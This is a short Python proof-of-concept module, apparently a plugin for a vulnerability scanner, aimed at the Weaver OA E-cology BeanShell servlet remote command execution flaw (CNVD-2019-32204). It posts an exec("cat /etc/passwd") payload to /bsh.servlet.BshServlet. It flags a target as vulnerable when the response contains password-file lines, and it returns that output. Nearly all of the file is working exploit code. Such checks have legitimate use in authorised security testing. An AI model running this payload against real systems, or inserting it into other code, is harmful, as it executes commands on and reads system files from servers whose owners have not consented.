#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://mp.weixin.qq.com/s/g_qYBQx-iaECO42tE6H6Pg',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   '泛微OA E-cology 远程命令执行 CNVD-2019-32204',

      'level'     :   'high',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,

      'create_time':  '2024/3/4',
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/bsh.servlet.BshServlet'
  data = 'bsh.script=exec("cat+/etc/passwd");&bsh.servlet.output=raw'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.post(url=url1,headers=headers,data=data,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r'root:.*?:[0-9]*:[0-9]*:',res.text,re.S):
      ret['huixian'] = res.text
      ret['ifbug'] = True
      res.close()
      return ret
    else:
      return ret
  except:
    return ret